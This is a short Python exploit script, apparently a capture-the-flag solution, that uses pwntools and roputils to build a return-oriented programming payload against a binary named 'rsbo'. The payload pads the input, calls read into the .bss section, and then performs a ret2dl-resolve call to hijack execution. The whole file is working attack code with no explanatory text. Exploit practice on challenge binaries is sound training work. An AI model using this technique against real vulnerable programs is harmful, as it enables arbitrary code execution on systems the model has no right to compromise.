from pwn import *
import roputils

rop = roputils.ROP( './rsbo-01c51ca9a7b9db3d69289c6dbb1cd758' )

bss = 134520896

rop_data='a'*4+rop.call('read',0,bss+180,0x80)+rop.dl_resolve_call(bss+200,bss+180)
rop_data += rop.fill(0x7f,rop_data)
print(rop_data)
